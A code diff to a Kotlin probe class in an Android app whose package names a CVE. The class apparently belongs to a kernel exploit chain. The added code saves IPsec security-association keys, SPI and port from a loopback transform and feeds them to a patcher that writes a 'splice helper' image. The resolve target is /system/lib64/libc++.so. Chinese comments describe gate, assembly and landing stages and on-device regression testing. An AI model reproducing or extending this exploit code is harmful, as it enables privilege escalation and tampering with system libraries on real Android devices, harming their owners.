@@ -40,6 +40,12 @@ object TypedBackendProbe {
     @Volatile
     private var probeContext: android.content.Context? = null
 
+    /** SA 建好后的材料：**只给写路径**用（门/拼装的材料不受影响）。 */
+    @Volatile private var saSpi: Int = 0
+    @Volatile private var saEncapPort: Int = 4500
+    @Volatile private var saAesKey: ByteArray? = null
+    @Volatile private var saHmacKey: ByteArray? = null
+
     fun run(context: android.content.Context): List<String> {
         probeContext = context
         val lines = mutableListOf<String>()
@@ -141,6 +147,10 @@ object TypedBackendProbe {
                 )
                 .setIpv4Encapsulation(encap, 4500)
                 .buildTransportModeTransform(loopback, spiObj)
+            saSpi = spi
+            saEncapPort = encapPort
+            saAesKey = aesKey
+            saHmacKey = hmacKey
             step("typed: ipsec sa built transform=" + (transform != null))
             val frame = com.ghostlock.app.jni.cve43284.SaFrame.build(spi, encapPort, 4500, aesKey, hmacKey)
             val written = com.ghostlock.app.jni.cve43284.SaFrame.writeTo(
@@ -431,6 +441,28 @@ object TypedBackendProbe {
         sequencePresent = true,
     )
 
+    /**
+     *  写路径专用的会话材料：与内核里那条 SA 一致（ESP 报文才会被处理）。
+     *
+     *  @note 与 init43284() 分开：后者服务门/拼装/落地，改它会把门弄坏（2026-10-15 真机回归）。
+     */
+    private fun saInit(): Init43284 {
+        val aes = saAesKey
+        val hmac = saHmacKey
+        if (aes == null || hmac == null) {
+            return init43284()
+        }
+        return Init43284(
+            spi = saSpi,
+            encapPort = saEncapPort,
+            senderPort = 0,
+            icvLength = 16,
+            aesKey = aes,
+            hmacKey = hmac,
+            initialSequence = 1,
+            sequencePresent = true,
+        )
+    }
     private fun resolve43284() = com.ghostlock.app.core.generated.ResolveTarget43284(
         role = 1,
         path = "/system/lib64/libc++.so".toByteArray(),
@@ -551,7 +583,7 @@ object TypedBackendProbe {
         step("typed: patch1 init=" + patcher.initializeAccessAndRemember(patchParams, init43284()) +
             " refusal=" + patcher.lastRefusal)
         val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
-        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, init43284()) else false
+        val patchWrote = if (helperForPatch != null) patcher.writeImage(helperForPatch, 0L, 16L, saInit()) else false
         step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
             " helperBytes=" + (helperForPatch?.size ?: -1))
         step("typed: patch1 accessDestroy=" + patcher.destroyAccessNow())
